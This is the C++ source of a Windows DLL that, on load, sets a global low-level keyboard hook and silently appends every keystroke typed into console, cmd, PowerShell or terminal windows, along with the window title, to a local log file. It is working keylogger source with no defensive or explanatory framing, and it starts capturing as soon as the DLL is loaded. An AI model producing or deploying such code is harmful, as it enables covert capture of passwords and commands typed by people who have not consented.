// cl /LD inlinehook.cpp /link /machine:x64 /out:inlinehook.dll user32.lib kernel32.lib
// Console-specific keyboard hook (uses WH_KEYBOARD_LL but filters for console windows)
#include <windows.h>
#include <fstream>
#include <string>

HHOOK hHook = nullptr;

std::string VirtualKeyToString(DWORD vkCode) {
    // Handle letters A-Z
    if (vkCode >= 0x41 && vkCode <= 0x5A) {
        bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        bool capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
        bool uppercase = shiftPressed ^ capsLock;
        
        char letter = static_cast<char>(vkCode);
        if (!uppercase) {
            letter += 32;
        }
        return std::string(1, letter);
    }
    
    // Handle numbers 0-9
    if (vkCode >= 0x30 && vkCode <= 0x39) {
        bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        if (shiftPressed) {
            const char symbols[] = ")!@#$%^&*(";
            return std::string(1, symbols[vkCode - 0x30]);
        } else {
            return std::string(1, static_cast<char>(vkCode));
        }
    }
    
    // Handle special keys
    switch (vkCode) {
        case VK_SPACE: return " ";
        case VK_RETURN: return "\n";
        case VK_TAB: return "\t";
        case VK_BACK: return "[BACKSPACE]";
        case VK_DELETE: return "[DELETE]";
        case VK_ESCAPE: return "[ESC]";
        case VK_LSHIFT:
        case VK_RSHIFT: return "";
        case VK_LCONTROL:
        case VK_RCONTROL: return "[CTRL]";
        case VK_LMENU:
        case VK_RMENU: return "[ALT]";
        case VK_LWIN:
        case VK_RWIN: return "[WIN]";
        case VK_UP: return "[UP]";
        case VK_DOWN: return "[DOWN]";
        case VK_LEFT: return "[LEFT]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_HOME: return "[HOME]";
        case VK_END: return "[END]";
        case VK_PRIOR: return "[PGUP]";
        case VK_NEXT: return "[PGDN]";
        case VK_INSERT: return "[INSERT]";
        case VK_F1: case VK_F2: case VK_F3: case VK_F4:
        case VK_F5: case VK_F6: case VK_F7: case VK_F8:
        case VK_F9: case VK_F10: case VK_F11: case VK_F12:
            return "[F" + std::to_string(vkCode - VK_F1 + 1) + "]";
        
        case VK_OEM_PERIOD: return (GetAsyncKeyState(VK_SHIFT) & 0x8000) ? ">" : ".";
        case VK_OEM_COMMA: return (GetAsyncKeyState(VK_SHIFT) & 0x8000) ? "<" : ",";
        case VK_OEM_1: return (GetAsyncKeyState(VK_SHIFT) & 0x8000) ? ":" : ";";
        case VK_OEM_2: return (GetAsyncKeyState(VK_SHIFT) & 0x8000) ? "?" : "/";
        case VK_OEM_3: return (GetAsyncKeyState(VK_SHIFT) & 0x8000) ? "~" : "`";
        case VK_OEM_4: return (GetAsyncKeyState(VK_SHIFT) & 0x8000) ? "{" : "[";
        case VK_OEM_5: return (GetAsyncKeyState(VK_SHIFT) & 0x8000) ? "|" : "\\";
        case VK_OEM_6: return (GetAsyncKeyState(VK_SHIFT) & 0x8000) ? "}" : "]";
        case VK_OEM_7: return (GetAsyncKeyState(VK_SHIFT) & 0x8000) ? "\"" : "'";
        case VK_OEM_MINUS: return (GetAsyncKeyState(VK_SHIFT) & 0x8000) ? "_" : "-";
        case VK_OEM_PLUS: return (GetAsyncKeyState(VK_SHIFT) & 0x8000) ? "+" : "=";
        
        default:
            return "[KEY:" + std::to_string(vkCode) + "]";
    }
}

bool IsConsoleWindow(HWND hWnd) {
    char className[256];
    GetClassNameA(hWnd, className, sizeof(className));
    
    // Check for console window classes
    return (strstr(className, "ConsoleWindowClass") != nullptr ||
            strstr(className, "Console") != nullptr ||
            strstr(className, "cmd") != nullptr ||
            strstr(className, "powershell") != nullptr ||
            strstr(className, "Terminal") != nullptr);
}

LRESULT CALLBACK ConsoleKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        // Get the current foreground window
        HWND foregroundWindow = GetForegroundWindow();
        
        // Only log if it's a console window
        if (IsConsoleWindow(foregroundWindow)) {
            KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
            std::string keyString = VirtualKeyToString(p->vkCode);
            
            if (!keyString.empty()) {
                // Get window title for context
                char windowTitle[256];
                GetWindowTextA(foregroundWindow, windowTitle, sizeof(windowTitle));
                
                std::ofstream log("C:\\Users\\X\\Desktop\\KeyHook2\\log.txt", std::ios::app);
                log << "[CONSOLE:" << windowTitle << "] " << keyString;
                log.close();
            }
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

DWORD WINAPI HookThread(LPVOID) {
    HINSTANCE hInstance = GetModuleHandle(nullptr);
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, ConsoleKeyboardProc, hInstance, 0);
    
    std::ofstream log("C:\\Users\\X\\Desktop\\KeyHook2\\log.txt", std::ios::app);
    log << "[CONSOLE] Console-specific keyboard hook installed" << std::endl;
    log.close();
    
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hHook);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(nullptr, 0, HookThread, nullptr, 0, nullptr);
    }
    return TRUE;
}
